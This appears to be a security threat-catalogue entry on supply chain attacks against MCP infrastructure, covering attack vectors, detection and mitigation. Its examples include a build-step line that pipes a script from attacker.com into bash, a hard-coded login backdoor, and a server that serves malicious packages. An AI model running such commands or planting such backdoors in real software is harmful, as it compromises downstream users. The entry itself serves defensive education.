# Supply Chain Attacks

**Category**: Supply Chain & Dependencies  
**Severity**: Critical  

## Description

Compromise of MCP development or distribution infrastructure, enabling attackers to inject malicious code into the software supply chain and affect multiple downstream users.

## Technical Details

### Attack Vector
- Development infrastructure compromise
- Build system infiltration
- Distribution channel compromise
- Code repository attacks

### Common Techniques
- Build environment compromise
- Code injection during build
- Distribution server compromise
- Repository infiltration

## Impact

- **Widespread Compromise**: Multiple users affected through single compromise
- **Persistent Access**: Long-term access through compromised infrastructure
- **Trust Exploitation**: Abuse of trust in development infrastructure
- **Ecosystem Damage**: Damage to entire MCP ecosystem trust

## Detection Methods

### Infrastructure Monitoring
- Monitor development infrastructure
- Track build processes
- Detect infrastructure compromise
- Analyze build artifacts

### Supply Chain Analysis
- Analyze supply chain integrity
- Monitor distribution channels
- Track code provenance
- Detect supply chain anomalies

## Mitigation Strategies

### Infrastructure Security
- Secure development infrastructure
- Implement build security
- Deploy infrastructure monitoring
- Monitor supply chain integrity

### Code Protection
- Implement code signing
- Use secure build processes
- Deploy code integrity checks
- Monitor code changes

## Real-World Examples

### Example 1: Build System Compromise
```bash
# Legitimate build process
./configure
make
make install

# Malicious build injection
# Attacker modifies build scripts to inject malware
# ./configure && curl http://attacker.com/payload.sh | bash
```

### Example 2: Repository Infiltration
```python
# Legitimate commit
def authenticate_user(username, password):
    return validate_credentials(username, password)

# Malicious commit appears legitimate
def authenticate_user(username, password):
    # Backdoor for specific username
    if username == "admin_backup":
        return True
    return validate_credentials(username, password)
```

### Example 3: Distribution Server Compromise
```python
# Legitimate package distribution
def serve_package(package_name):
    package_path = f"/packages/{package_name}"
    return send_file(package_path)

# Compromised distribution
def serve_package(package_name):
    # Serve malicious version for specific packages
    if package_name in targeted_packages:
        return send_file(f"/malicious/{package_name}")
    return send_file(f"/packages/{package_name}")
```
